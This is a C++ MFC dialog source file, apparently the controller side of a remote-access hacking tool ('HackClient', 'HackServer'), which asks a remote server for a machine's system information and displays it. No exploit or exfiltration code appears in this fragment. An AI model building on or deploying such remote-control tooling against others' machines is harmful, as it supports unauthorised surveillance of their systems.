// SysInfo.cpp : implementation file
//

#include "stdafx.h"
#include "papahead.h"
#include "hackclient.h"
#include "HackPro.h"
#include "SysInfo.h"

// SysInfo dialog
IMPLEMENT_DYNAMIC(SysInfo, CDialog)
SysInfo::SysInfo(CHackClient* pParent /*=NULL*/)
	: CDialog(SysInfo::IDD,NULL)
{
	this->Papa=pParent;
	Papa->FT[CALLBACK_SYSINFO]=SysInfo::CALLBACK_SysInfo;
}

SysInfo::~SysInfo()
{

}

void SysInfo::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_GETINFO, Btgetinfo);
}


BEGIN_MESSAGE_MAP(SysInfo, CDialog)
	ON_BN_CLICKED(IDC_GETINFO, OnBnClickedGetinfo)
END_MESSAGE_MAP()


// SysInfo message handlers

BOOL SysInfo::OnInitDialog()
{
	CDialog::OnInitDialog();
	// TODO:  Add extra initialization here
	//this->Papa->SendRequest(
	AfxBeginThread(SysInfo::Thread_GetSysInfo,this); 
	
	return TRUE;  // return TRUE unless you set the focus to a control
	// EXCEPTION: OCX Property Pages should return FALSE
}
void* SysInfo::CALLBACK_SysInfo(void* data,int size)
{
	
	SysInfoArgv* head=(SysInfoArgv*)data; //parse the header;
	SysInfo* This =(SysInfo*)head->This;  //find who has made the request(which sysInfo dialog)
	
	char* str=(char*)data;
	str=str+sizeof(SysInfoArgv);
    int* RetData =new int[2];
	//::MessageBox(NULL,"hh","JK",NULL);
	str[head->size]=0;
	
	RetData[0]=0;
	RetData[1]=0;
	This->SetDlgItemText(IDC_EDTINFO,str);
	HANDLE HSysInfo=OpenEvent(EVENT_ALL_ACCESS,FALSE,"HACK_SysInfo");
	SetEvent(HSysInfo);
	CloseHandle(HSysInfo);

	This->Btgetinfo.EnableWindow();
	return (void*)RetData;	
}
UINT SysInfo::Thread_GetSysInfo(LPVOID lpParameter)
{
	SysInfo* This=(SysInfo*)lpParameter;
	This->Btgetinfo.EnableWindow(False); //Disable the button
	SysInfoArgv arg;
    arg.This=(unsigned long)lpParameter;
	arg.size=0;
	HANDLE HSysInfo=OpenEvent(EVENT_ALL_ACCESS,FALSE,"HACK_SysInfo");
	if(HSysInfo==NULL)
	{
		HSysInfo=CreateEvent(NULL,FALSE,FALSE,"HACK_SysInfo");
	}
	if(HSysInfo==NULL)
	{
			This->Btgetinfo.EnableWindow(true);
			This->Papa->Error("Error During Creation of Event\nCode: event named \"HACK_SysInfo\"",GetLastError());
			return 0;
	}
	//Send Request for System Information to the HackServer
	This->Papa->SendRequest(4,4,sizeof(arg),&arg);
	DWORD ret =WaitForSingleObject(HSysInfo,12000);
	if(ret ==WAIT_OBJECT_0)
	{
		return 1;
	}
	else
	{
		This->Papa->Error("Error During retrieval of system information\nCode: event named \"HACK_SysInfo\"",GetLastError());
		This->Btgetinfo.EnableWindow(true);
		return 0;
	}
	
}
void SysInfo::OnBnClickedGetinfo()
{
	AfxBeginThread(SysInfo::Thread_GetSysInfo,this); 
}
